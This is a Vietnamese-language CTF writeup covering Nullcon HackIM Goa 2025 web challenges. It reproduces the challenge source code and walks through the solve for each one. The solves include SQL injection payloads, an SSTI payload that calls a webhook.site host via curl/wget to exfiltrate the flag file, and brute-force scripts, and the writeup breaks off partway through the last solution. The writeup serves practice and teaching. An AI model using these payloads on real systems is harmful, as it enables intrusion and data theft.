---
title: "Nullcon HackIM CTF Goa 2025"
description: "Nullcon HackIM CTF Goa 2025"
summary: "Nullcon HackIM CTF Goa 2025 writeup"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-02-04
draft: false
cover: ../../post/nullcon/feature.jpg

authors:
  - winky
---



## Paginator

### Hints

SQL Injection

### Solution

Challenge cho mình một trang web sau

![image](https://hackmd.io/_uploads/ry1Yb-Auyl.png)

Và đây là source của web

```php
<?php
ini_set("error_reporting", 0);
ini_set("display_errors",0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$db = new SQLite3('/tmp/db.db');
try {
  $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Flag', '" . base64_encode($FLAG) . "')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} catch(Exception $e) {
  //var_dump($e);
}


if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
  [$min, $max] = explode(",",$_GET['p']);
  if(intval($min) <= 1 ) {
    die("This post is not accessible...");
  }
  try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
      echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"<br>";
    }
  }catch(Exception $e) {
    echo "Try harder!";
  }
} else {
    echo "Try harder!";
}
?>

<html>
    <head>
        <title>Paginator</title>
    </head>
    <body>
        <h1>Paginator</h1>
        <a href="/?p=2,10">Show me pages 2-10</a>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
Try harder!
```

Tóm tắt thì trong param "p" chúng ta nhận được 2 số và web sẽ list các page có index giữa 2 số đó.

![image](https://hackmd.io/_uploads/r1t2--AOJg.png)

Ở đây, mình không query được page 1 là page chứa flag do nó sẽ lấy min của 2 số nhưng lại cấm số 1.

![image](https://hackmd.io/_uploads/S1LkMbRd1e.png)

Lúc này mình chắc chắn web bị dính lỗi SQL injection do có thực hiện SQL query và biến $max được truyền vào mà không filter gì cả. Nên mình có thể sử dụng payload `2, 10 OR 1=1` để lấy tất cả các page.

![image](https://hackmd.io/_uploads/HJE0--COJx.png)

Sau khi query thì mình có một chuỗi là flag đã bị base64 encode nên mình tiến hành decode lại.

![image](https://hackmd.io/_uploads/B1k-zWRd1g.png)

Flag: ENOs{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}

## Paginator v2

### Hints

SQL Injection

### Solution

Challenge cho mình một trang web giống version trước

![image](https://hackmd.io/_uploads/HJk4Mb0Okx.png)

```php
<?php
ini_set("error_reporting", 1);
ini_set("display_errors",1);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php"; // Now the juicy part is hidden away! $db = new SQLite3('/tmp/db.db');

try{
  $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} catch(Exception $e) {
  //var_dump($e);
}


if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
  [$min, $max] = explode(",",$_GET['p']);
  if(intval($min) <= 1 ) {
    die("This post is not accessible...");
  }
  try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
      echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"<br>";
    }
  }catch(Exception $e) {
    echo "Try harder!";
  }
} else {
    echo "Try harder!";
}
?>

<html>
    <head>
        <title>Paginator v2</title>
    </head>
    <body>
        <h1>Paginator v2</h1>
        <a href="/?p=2,10">Show me pages 2-10</a>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
Try harder!
```

Ở đây flag không còn nằm ở page 1 nữa mà nằm hẳn ở một table khác nên mình thử xem sqlite_master để list các mảng xem như thế nào. 

`2, 10 union select name,name,name from sqlite_master`

Sau khi query thì mình dính lỗi và không lấy được sqlite_master

![image](https://hackmd.io/_uploads/rJ-OzZC_ye.png)

Có lẽ web đã chặn duplicate column hay gì đó nên mình tìm payload khác và thấy được cái này

![image](https://hackmd.io/_uploads/ByoTXZAuke.png)

Mình thử query thử xem có gì hot

`2, 10 union select * from (select name from sqlite_master)a join (select name from sqlite_master)b join (select name from sqlite_master)c`

![image](https://hackmd.io/_uploads/Bylz4WAuke.png)

Bump, web list hết các table của database và mình thấy có bảng flag nên query và lấy flag thôi.

`2, 10 union select * from flag`

![image](https://hackmd.io/_uploads/HymIEW0dkx.png)

Base64 decode lại là xong.

![image](https://hackmd.io/_uploads/HJL_VbA_kx.png)

Flag: ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow_AgA1n_And_Ag41n!}

## Numberizer

### Hints

Integer overflow

### Solution

Challenge cho mình một trang web như sau

![image](https://hackmd.io/_uploads/rklpN-AO1x.png)

Source của web : 

```php
<?php
ini_set("error_reporting", 0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$MAX_NUMS = 5;

if(isset($_POST['numbers']) && is_array($_POST['numbers'])) {

    $numbers = array();
    $sum = 0;
    for($i = 0; $i < $MAX_NUMS; $i++) {
        if(!isset($_POST['numbers'][$i]) || strlen($_POST['numbers'][$i])>4 || !is_numeric($_POST['numbers'][$i])) {
            continue;
        }
        $the_number = intval($_POST['numbers'][$i]);
        if($the_number < 0) {
            continue;
        }
        $numbers[] = $the_number;
    }
    $sum = intval(array_sum($numbers));


    if($sum < 0) {
        echo "You win a flag: $FLAG";
    } else {
        echo "You win nothing with number $sum ! :-(";
    }
}
?>

<html>
    <head>
        <title>Numberizer</title>
    </head>
    <body>
        <h1>Numberizer</h1>
        <form action="/" method="post">
            <label for="numbers">Give me at most 10 numbers to sum!</label><br>
            <?php
            for($i = 0; $i < $MAX_NUMS; $i++) {
                echo '<input type="text" name="numbers[]"><br>';
            }
            ?>
            <button type="submit">Submit</button>
        </form>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
```

Có thể thấy web sẽ nhận vào 5 số sau đó tính tổng và nếu tổng đó âm thì sẽ trả ra flag. Nhưng nó lại cấm truyền vào các số nhỏ hơn 0 nên mình nghĩ đến việc truyền vào số cực lớn và gây tràn số. 

![image](https://hackmd.io/_uploads/S1zb8-Adyl.png)

Ok thì mình biết cần truyền gì vào rồi nhưng lại có vấn đề là chuỗi mình truyền vào phải có độ dài <= 4. Lúc này mình có thử tìm cách và thấy intval có thể chuyển các số có dạng mũ 10 như sau

![image](https://hackmd.io/_uploads/BJdjhS1Kyg.png)

Từ đó ta có thể điền các số 9e99 vào để gây tràn số

![image](https://hackmd.io/_uploads/HJZBUW0d1l.png)

Và ta có flag

![image](https://hackmd.io/_uploads/S10HUbRdJl.png)

Flag: ENO{INTVAL_IS_NOT_ALW4S_P0S1TiV3!}

## Temptation

### Hints

Server side template injection

### Solution

Challenge cho mình một trang web như sau

![image](https://hackmd.io/_uploads/rkqCLZRO1l.png)

Điền vào cái gì thì web cũng tra ra too tempted nên mình ngó sang devtool xem có gì hot.

![image](https://hackmd.io/_uploads/BygQvW0uye.png)

Ở đây nếu ta query source thì ta se xem được source của web như sau

![image](https://hackmd.io/_uploads/HkyrPWCdkg.png)

```python
import web
from web import form
web.config.debug = False
urls = (
  '/', 'index'
)
app = web.application(urls, locals())
render = web.template.render('templates/')
FLAG = open("/tmp/flag.txt").read()

temptation_Form = form.Form(
    form.Password("temptation", description="What is your temptation?"),
    form.Button("submit", type="submit", description="Submit")
)

class index:
    def GET(self):
        try:
            i = web.input()
            if i.source:
                return open(__file__).read()
        except Exception as e:
            pass
        f = temptation_Form()
        return render.index(f)

    def POST(self):
        f = temptation_Form()
        if not f.validates():
            return render.index(f)
        i = web.input()
        temptation = i.temptation
        if 'flag' in temptation.lower():
            return "Too tempted!"
        try:
            temptation = web.template.Template(f"Your temptation is: {temptation}")()
        except Exception as  e:
            return "Too tempted!"
        if str(temptation) == "FLAG":
            return FLAG
        else:
            return "Too tempted!"
application = app.wsgifunc()
if __name__ == "__main__":
    app.run()
```

Ở đây web xài framework [webpy](https://webpy.org/) và có một đoạn web sẽ truyền biến temptation vào `temptation = web.template.Template(f"Your temptation is: {temptation}")()
` nên mình chắc chắn web bị dính SSTI. Mình thử payload sau và catch được webhook.

`${__import__('os').system('curl https://webhook.site/9014953e-496e-467e-9e71-c95ea9444dad')}`

![image](https://hackmd.io/_uploads/SJyUCbA_1g.png)

Ok ngon rồi giờ chỉ cần chỉnh lại payload để lấy flag là xong

```${__import__('os').system('$(wget https://webhook.site/9014953e-496e-467e-9e71-c95ea9444dad/a?b=`cat /tmp/fla*`);')}```

![image](https://hackmd.io/_uploads/r1V9-GC_ye.png)

Flag : ENO{T3M_Pl4T_3S_4r3_S3cUre!!}

## Bfail

### Hints

Bcrypt

### Solution

Challenge cho mình một trang web như sau

![image](https://hackmd.io/_uploads/SkNdsGRuJe.png)

Mình thử đăng nhập nhưng không được nên lại mở devtool xem

![image](https://hackmd.io/_uploads/HJqnjGAuJx.png)

Thấy là source ở endpoint /source nên mình mở thử xem

![image](https://hackmd.io/_uploads/H1kRaMCOkg.png)

```python

from flask import Flask, request, redirect, render_template_string
import sys
import os
import bcrypt
import urllib.parse

app = Flask(__name__)
app.secret_key = os.urandom(16);
# This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway...
# >>> strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt())
# >>> strongpw[:71]
# b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
app.ADMIN_PW_HASH = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
FLAG = open("flag.txt").read();

@app.route('/source')
def source():
    return open(__file__).read()

@app.route('/', methods=["GET"])
def index():

    username = request.form.get("username", None)
    password = request.form.get("password", None)

    if username and password:

        username = urllib.parse.unquote_to_bytes(username)
        password = urllib.parse.unquote_to_bytes(password)

        if username != b"admin":
            return "Wrong user!"

        if len(password) > 128:
            return "Password too long!"

        if not bcrypt.checkpw(password, app.ADMIN_PW_HASH):
            return "Wrong password!"

        return f"""Congrats! It appears you have successfully bf'ed the password. Here is your {FLAG}"""
    
    # Use f-string formatting within the template string
    template_string = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Bfail</title>
    </head>
    <body>
        <h1>Login to get my secret, but 'B'-ware of the strong password!</h1>
        <form action="/" method="post">
            <label for="username">Username:</label>
            <input type="text" name="username"  placeholder="admin">
            <br>
            <label for="password">Password:</label>
            <input type="password" name="password">
            <br>
            <button type="submit">Login</button>
        </form>
    <!-- See my <a href="/source">Source</a> -->
    </body>
    </html>
    """

    return render_template_string(template_string)

if __name__ == '__main__':
   app.run(debug=False, host="0.0.0.0", port="8080", threaded=True)
```

Ok thì tóm tắt là web sẽ tạo ra một cái strongpw từ random và bcrypt và cho ta biết 71 byte đầu của strongpw đó. Nhiệm vụ của mình là tìm ra password sao cho khi bcrypt hash thì trùng với app.ADMIN_PW_HASH mà challenge cho hay nói cách khác là crack app.ADMIN_PW_HASH.

Lúc này mình research thì thấy bcrypt nó chỉ có tối đa 72 byte thôi https://www.ory.sh/docs/troubleshooting/bcrypt-secret-length. Nên mình chỉ cần sử dụng strongpw 71 byte kia rồi brute force là lấy được strongpw đầy đủ.

```python
import urllib.parse
import bcrypt
import urllib
pw = b"\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76"
ADMIN_PW_HASH = b"$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK"
salt = ADMIN_PW_HASH[:29]

for i in range(165, 256):
    brute_pw = pw + bytes([i])
    print(i)
    if bcrypt.hashpw(brute_pw, salt) == ADMIN_PW_HASH:
        print("Found: ", brute_pw)
        print("Password is", urllib.parse.quote_from_bytes(brute_pw))
        break
```

![image](https://hackmd.io/_uploads/Hy8IX7Ruke.png)

Sau khi bruteforce thì mình có được strongpw nên mình tiến hành đăng nhập lại nhưng không được.

![image](https://hackmd.io/_uploads/Hk6OzXCOye.png)

Ở đây là lỗi về method nên mình chỉ cần chuyền từ POST method sang GET method là lấy được flag thôi

![image](https://hackmd.io/_uploads/SJmoQXRO1g.png)

ENO{BCRYPT_FAILS_TO_B_COOL_IF_THE_PW_IS_TOO_LONG}

## Crahp

#### Hints

Brute force

#### Solution

Challenge cho mình một trang web như sau

![image](https://hackmd.io/_uploads/Bkdg47AuJe.png)

Source của web : 

```php 
<?php
ini_set("error_reporting", 0);
ini_set("display_errors",0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}


// https://www.php.net/manual/en/function.crc32.php#28012
function crc16($string) {
  $crc = 0xFFFF;
  for ($x = 0; $x < strlen ($string); $x++) {
    $crc = $crc ^ ord($string[$x]);
    for ($y = 0; $y < 8; $y++) {
      if (($crc & 0x0001) == 0x0001) {
        $crc = (($crc >> 1) ^ 0xA001);
      } else { $crc = $crc >> 1; }
    }
  }
  return $crc;
}


// https://stackoverflow.com/questions/507041/crc8-check-in-php/73305496#73305496
function crc8($input)
{
$crc8Table = [
    0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
    0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
    0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
    0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
    0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
    0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
    0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
    0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
    0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
    0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
    0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
    0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
    0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
    0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
    0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
    0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
    0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
    0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
    0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
    0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
    0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
    0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
    0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
    0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
    0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
    0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
    0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
    0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
    0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
    0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
    0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
    0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
];

    $byteArray = unpack('C*', $input);
    $len = count($byteArray);
    $crc = 0;
    for ($i = 1; $i <= $len; $i++) {
        $crc = $crc8Table[($crc ^ $byteArray[$i]) & 0xff];
    }
    return $crc & 0xff;
}

$MYPASSWORD = "AdM1nP@assW0rd!";
include "flag.php";

if(isset($_POST['password']) && strlen($MYPASSWORD) == strlen($_POST['password'])) {
    $pwhash1 = crc16($MYPASSWORD);
    $pwhash2 = crc8($MYPASSWORD);

    $password = $_POST['password'];
    $pwhash3 = crc16($password);
    $pwhash4 = crc8($password);

    if($MYPASSWORD == $password) {
        die("oops. Try harder!");
    }
    if($pwhash1 != $pwhash3) {
        die("Oops. Nope. Try harder!");
    }
    if($pwhash2 != $pwhash4) {
        die("OoOps. Not quite. Try harder!");
    }
    $access = true;
 
    if($access) {
        echo "You win a flag: $FLAG";
    } else {
        echo "Denied! :-(";
    }
} else {
    echo "Try harder!";
}
?>

<html>
    <head>
        <title>Craphp</title>
    </head>
    <body>
        <h1>Craphp</h1>
        <form action="/" method="post">
            <label for="password">Give me your password!</label><br>
            <input type="text" name="password"><br>
            <button type="submit">Submit</button>
        </form>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
```

Ok thì web yêu cầu tìm một password sao cho cùng length với $MYPASSWORD = "AdM1nP@assW0rd!" là 15. Thêm đó là crc16 và crc8 phải trùng với của $MYPASSWORD. Lúc này thì mình thấy giá trị của crc16 và crc8 khá nhỏ nên có thể bruteforce được nên mình tiến hành bruteforce từ số 100000010000000 do có 15 chữ số.

```php
<?php

// https://www.php.net/manual/en/function.crc32.php#28012
function crc16($string) {
  $crc = 0xFFFF;
  for ($x = 0; $x < strlen ($string); $x++) {
    $crc = $crc ^ ord($string[$x]);
    for ($y = 0; $y < 8; $y++) {
      if (($crc & 0x0001) == 0x0001) {
        $crc = (($crc >> 1) ^ 0xA001);
      } else { $crc = $crc >> 1; }
    }
  }
  return $crc;
}


// https://stackoverflow.com/questions/507041/crc8-check-in-php/73305496#73305496
function crc8($input)
{
$crc8Table = [
    0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
    0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
    0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
    0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
    0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
    0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
    0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
    0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
    0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
    0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
    0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
    0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
    0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
    0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
    0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
    0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
    0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
    0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
    0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
    0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
    0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
    0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
    0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
    0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
    0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
    0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
    0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
    0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
    0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
    0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
    0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
    0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
];

    $byteArray = unpack('C*', $input);
    $len = count($byteArray);
    $crc = 0;
    for ($i = 1; $i <= $len; $i++) {
        $crc = $crc8Table[($crc ^ $byteArray[$i]) & 0xff];
    }
    return $crc & 0xff;
}

$MYPASSWORD = "AdM1nP@assW0rd!";
$pwhash1 = crc16($MYPASSWORD);
$pwhash2 = crc8($MYPASSWORD);
$n = 100000010000000;
while (true) {
    $s = strval($n);
    echo $s . "\n";
    if (crc16($s) == $pwhash1 && crc8($s) == $pwhash2) {
        echo "Found: $s\n";
        break;
    }
    $n++;
}

?>
```

Sau khi bruteforce thì mình có password là chuỗi sau

![image](https://hackmd.io/_uploads/HkyTtO0dJe.png)

Đăng nhập lại và ta có flag

![image](https://hackmd.io/_uploads/BJUBqOCuJg.png)

Flag : ENO{Cr4hP_CRC_Collison_1N_P@ssw0rds!}


## <p>Sess.io</p>

### Hints

Brute force

### Solution

Bài này khá là ảo ma và tốn thời gian đối với mình :)) 



![image](https://hackmd.io/_uploads/Hy_h9u0u1x.png)

Source của web : 

```php
<?php
define("ALPHA", str_split("abcdefghijklmnopqrstuvwxyz0123456789_-"));
ini_set("error_reporting", 0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php"; // $FLAG
$SEEDS = str_split($FLAG, 4);

function session_id_secure($id) {
    global $SEEDS;
    mt_srand(intval(bin2hex($SEEDS[md5($id)[0] % (count($SEEDS))]),16));
    $id = "";
    for($i=0;$i<1000;$i++) {
        $id .= ALPHA[mt_rand(0,count(ALPHA)-1)];
    }
    return $id;
}

if(isset($_POST['username']) && isset($_POST['password'])) {
    session_id(session_id_secure($_POST['username'] . $_POST['password']));
    session_start();
    echo "Thank you for signing up!";
}else {
    echo "Please provide the necessary data!";
}
?>

<html>
    <head>
        <title>Sess.io</title>
    </head>
    <body>
        <h1>Sess.io</h1>
        <h2>Sign up</h2>
        <form action="/" method="post">
            <label for="username">Username:</label><br>
            <input type="text" name="username"><br>

            <label for="password">Password:</label><br>
            <input type="text" name="password"><br>

            <button type="submit">Submit</button>
        </form>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
```

Ok cùng phân tích nè :  
* Web sẽ lấy username và password và nối nó lại sau đó lấy chữ cái đầu của md5 hash của chuỗi đó. 
Ví dụ : 

username = "hatsune" và password = "miku"
=> \$id = "hatsunemiku"
=> md5(\$id) = "3523fe5f96966420a1950e514dcc7413"
=> md5(\$id)[0] = "3"
=> \$SEEDS[md5($id)[0] % (count(\$SEEDS))] sẽ lấy \$SEEDS có index 3 và chuyển sang hex để làm seed của mt_srand

Ok trông thì phức tạp nhưng solution của ta có thể bruteforce như sau. Đầu tiên ta tìm các cặp username và password sao cho md5(\$id)[0] là một con số bằng solve script sau

```php
<?php

function get_user_pass(){
    $chr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    $chr = str_split($chr);
    $arr = [];
    foreach ($chr as $i) {
        foreach ($chr as $j) {
            $s = $i . $j;
            if (is_numeric(md5($s)[0])){
                $arr[md5($s)[0]] = [$i, $j];
            }
        }
    }
    return $arr;
}

var_dump(get_user_pass());
?>
```

Ok có thể thấy khi chạy thì ta nhận được mảng có 10 phần tử tương đương md5(\$id)[0] = 0 thì ta có username = "z" và password = "h", v.v.

![image](https://hackmd.io/_uploads/SJ6-7VyYyx.png)

Ok lúc này ta sẽ lấy secure session id của các username và password trên cho việc brute force

```php
<?php

function get_user_pass(){
    $chr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    $chr = str_split($chr);
    $arr = [];
    foreach ($chr as $i) {
        foreach ($chr as $j) {
            $s = $i . $j;
            if (is_numeric(md5($s)[0])){
                $arr[md5($s)[0]] = [$i, $j];
            }
        }
    }
    return $arr;
}


function get_session($username, $password){
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_URL, 'http://52.59.124.14:5008/');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$username.'&password='.$password);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch,  CURLOPT_HEADER,  1); 
    
    $result = curl_exec($ch);
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', 
              $result,  $match_found); 
    $cookies = array(); 
    foreach($match_found[1] as $item) { 
        parse_str($item,  $cookie); 
        $cookies = array_merge($cookies,  $cookie); 
    } 
    curl_close($ch); 
    return $cookies["PHPSESSID"];
}


function solve(){
    $arr = get_user_pass();
    for ($i=0; $i < count($arr); $i++) { 
        $username = $arr[strval($i)][0];
        $password = $arr[strval($i)][1];
        $s_hash = get_session($username, $password);
        echo "Part " . $i+1 . " : " . $s_hash ."\n";
    }
}

solve();

?>
```

Sau khi chạy thì ta có 10 cái session tương đương với 10 phần của flag được chia ra vào \$SEEDS

![image](https://hackmd.io/_uploads/HytTQVJF1g.png)

Đến đây ta sẽ thực hiện bruteforce. Dưới đây là code mẫu ta có flag là "MIKU" có đúng 1 chunk thôi. Ta sẽ tiền hành sử dụng username và password vừa tìm ở trên và vì ta sử dụng chunk 0 nên nó là "z" và "h" ta vừa tìm.

```php
<?php
define("ALPHA", str_split("abcdefghijklmnopqrstuvwxyz0123456789_-"));

$FLAG = "MIKU";
$SEEDS = str_split($FLAG, 4);

function session_id_secure($id) {
    global $SEEDS;
    mt_srand(intval(bin2hex($SEEDS[md5($id)[0] % (count($SEEDS))]),16));
    $id = "";
    for($i=0;$i<1000;$i++) {
        $id .= ALPHA[mt_rand(0,count(ALPHA)-1)];
    }
    return $id;
}

function session_id_gen($id, $seed) {
    mt_srand(intval(bin2hex($seed),16));
    $id = "";
